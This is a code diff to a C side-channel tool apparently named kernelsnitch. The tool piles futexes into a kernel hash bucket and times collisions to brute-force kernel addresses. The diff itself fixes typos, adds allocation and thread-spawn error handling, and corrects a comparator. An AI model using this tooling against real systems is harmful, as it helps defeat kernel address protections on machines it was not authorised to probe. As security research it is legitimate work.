@@ -27,7 +27,7 @@
 #ifndef APPENDED_FUTEXES
 #define APPENDED_FUTEXES 4096
 #endif
-#define MULITPLE 4
+#define MULTIPLE 4
 #ifndef KERNELSNITCH_IDENTITY_START
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #endif
@@ -133,10 +133,26 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
     ks->increase_id = id;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
+        if (inc_arg == NULL) {
+            /* Degrade instead of crashing: keep the waiters created so far
+             * and let the caller decide whether the shallower pile-up is
+             * still usable. */
+            ks->increase_count = i;
+            pr_warning("waiter alloc failed at %zu/%zu\n", i, amount);
+            return;
+        }
         inc_arg->id = id;
         inc_arg->ks = ks;
-        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
-                              (void *)inc_arg));
+        int rc = pthread_create(&ks->increase_tids[i], 0, __do_increase,
+                                (void *)inc_arg);
+        if (rc != 0) {
+            free(inc_arg);
+            ks->increase_count = i;
+            pr_warning("waiter spawn failed at %zu/%zu rc=%d "
+                       "(requested=%zu actual=%zu)\n",
+                       i, amount, rc, amount, ks->increase_count);
+            return;
+        }
     }
     WAIT();
 }
@@ -165,7 +181,9 @@ static void __decrease(struct kernelsnitch_shared_state *ks)
 #endif
 static int __compare(const void *a, const void *b)
 {
-    return (*(size_t *)a - *(size_t *)b);
+    const size_t x = *(const size_t *)a;
+    const size_t y = *(const size_t *)b;
+    return (x > y) - (x < y);
 }
 
 /**
@@ -307,7 +325,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
-    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
+    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULTIPLE;
     ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
@@ -417,7 +435,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
     __increase(ks, ID, ks->appended_futexes);
-    if (ks->verbose) pr_info("start finding collisisons\n");
+    if (ks->verbose) pr_info("start finding collisions\n");
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
@@ -447,7 +465,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         }
     }
     if (wanted == count) {
-        if (ks->verbose) pr_info("found %zd collisisons\n", count);
+        if (ks->verbose) pr_info("found %zd collisions\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
         pr_warning("only found %zd collisions -> cannot continue\n", count);
